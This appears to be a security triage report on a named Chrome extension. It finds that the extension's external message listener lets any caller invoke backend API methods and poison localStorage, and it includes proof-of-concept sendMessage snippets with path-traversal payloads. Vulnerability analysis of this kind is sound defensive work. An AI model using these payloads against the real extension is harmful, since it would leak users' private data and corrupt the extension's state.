# CoCo Analysis: obibmghjadlaglomfgaoapfmhkmkhlga

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple flows representing the same core vulnerability

---

## Sink 1: bg_chrome_runtime_MessageExternal → jQuery_ajax_settings_url_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/obibmghjadlaglomfgaoapfmhkmkhlga/opgen_generated_files/bg.js
Line 8390: "user_id": params.data.userId,
Line 8795: "source_id": params.data.sourceId
Line 8861: get(Urls.URL + Urls.USERS + Urls.EXISTS + params.data.username, ...)
```

**Code:**

```javascript
// Background script (bg.js)

// External message listener - allows ANY external caller
chrome.runtime.onMessageExternal.addListener(onMessage); // Line 9190

function onMessage(request, sender, sendResponse) {
    if (request.event) {
        if (request.event === "API")
            callApi(request, sendResponse); // ← External request triggers API call
        // ...
    }
    return true;
}

function callApi(request, sendResponse) {
    app.api.call(request.method, request, sendResponse); // ← request.method controlled by attacker
    return true;
}

function call(method, params, sendResponse) {
    params._success = onSuccess;
    params._error = onError;
    params._complete = onComplete;

    methods[method](params); // ← Calls any method in the methods object with attacker params

    function onSuccess(data) {
        var response = {
            data: data,
            result: true
        };
        if (sendResponse !== null) {
            sendResponse(response); // ← Sends backend response to external attacker
        }
    }
    // ...
}

// Example vulnerable API method
function checkUsername(params) {
    get(
        Urls.URL + Urls.USERS + Urls.EXISTS + params.data.username, // ← attacker-controlled username in URL
        {},
        params._success, params._error, params._complete);
}

// Another example - getIncentiveFromSource
function getIncentiveFromSource(params) {
    get(
        Urls.URL + Urls.INCENTIVES + Urls.GET_BY_SOURCE_ID + params.data.sourceId, // ← attacker-controlled sourceId
        {},
        params._success, params._error, params._complete);
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker extension or whitelisted website sends external message
chrome.runtime.sendMessage(
    "obibmghjadlaglomfgaoapfmhkmkhlga", // Target extension ID
    {
        event: "API",
        method: "checkUsername", // Call any API method
        data: {
            username: "../../secrets" // Path traversal or injection attempt
        }
    },
    function(response) {
        console.log("Response from victim extension:", response);
        // Attacker receives data from the backend API
    }
);

// Or trigger SSRF to internal services
chrome.runtime.sendMessage(
    "obibmghjadlaglomfgaoapfmhkmkhlga",
    {
        event: "API",
        method: "getIncentiveFromSource",
        data: {
            sourceId: "../../../admin/users" // Try to access unauthorized endpoints
        }
    },
    function(response) {
        console.log("Leaked data:", response);
    }
);
```

**Impact:** Privileged cross-origin request abuse and information disclosure. An attacker (via malicious extension or potentially whitelisted website) can invoke any API method exposed by the extension, triggering requests to the backend API (`https://www.zerotrace.fr/` based on manifest permissions) with attacker-controlled parameters. The attacker receives the full response from these backend API calls, potentially leaking sensitive user data, authentication tokens, or other private information. The attacker can also enumerate users, query private data, or abuse any API endpoint exposed through the methods object.

---

## Sink 2: bg_chrome_runtime_MessageExternal → bg_localStorage_setItem_value_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/obibmghjadlaglomfgaoapfmhkmkhlga/opgen_generated_files/bg.js
Line 9727: app.storage.popup.setPopupTimePref(request.value);
Line 7814: value = JSON.stringify(value);
```

**Code:**

```javascript
// External message handler allows calling backend methods
function onMessage(request, sender, sendResponse) {
    if (request.event) {
        if (request.event === "API")
            callApi(request, sendResponse);
        else if (request.event === "BACK")
            methods[request.method](request, onSuccess, onError); // ← Can call BACK methods too
        // ...
    }
    return true;
}

// Example of storage poisoning via external message
// An attacker can call methods that write to localStorage with controlled values
// Line 9727 shows: app.storage.popup.setPopupTimePref(request.value);
// This ultimately calls localStorage.setItem with attacker-controlled value
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker poisons extension's localStorage
chrome.runtime.sendMessage(
    "obibmghjadlaglomfgaoapfmhkmkhlga",
    {
        event: "BACK",
        method: "setPopupTimePref", // Or other storage-writing methods
        value: "{\"malicious\": \"payload\"}"
    }
);
```

**Impact:** Storage poisoning. An attacker can write arbitrary data to the extension's localStorage, potentially corrupting application state, injecting malicious configurations, or setting up for second-order attacks if the stored data is later used in dangerous operations.

---

## Sink 3: jQuery_ajax_result_source → sendResponseExternal_sink (referenced only CoCo framework code)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/obibmghjadlaglomfgaoapfmhkmkhlga/opgen_generated_files/bg.js
Line 291: var jQuery_ajax_result_source = 'data_form_jq_ajax'; // CoCo framework code
```

**Classification:** TRUE POSITIVE (covered by Sink 1)

**Reason:** This flow is part of the same vulnerability as Sink 1. The CoCo framework code at line 291 models jQuery ajax responses as taint sources. The actual extension code shows that when external messages trigger API calls, the responses from the backend (via jQuery ajax) are sent back to the external caller via sendResponse (line 9070). This is covered by the analysis in Sink 1 above.

---

## Combined Vulnerability Summary

The extension exposes a comprehensive API to external callers via `chrome.runtime.onMessageExternal`. An attacker can:
1. Invoke any API method with arbitrary parameters
2. Receive full responses from backend API calls (information disclosure)
3. Poison localStorage with arbitrary values
4. Abuse the extension's permissions to make privileged cross-origin requests

This represents a complete compromise of the extension's security boundary between trusted internal code and untrusted external callers.
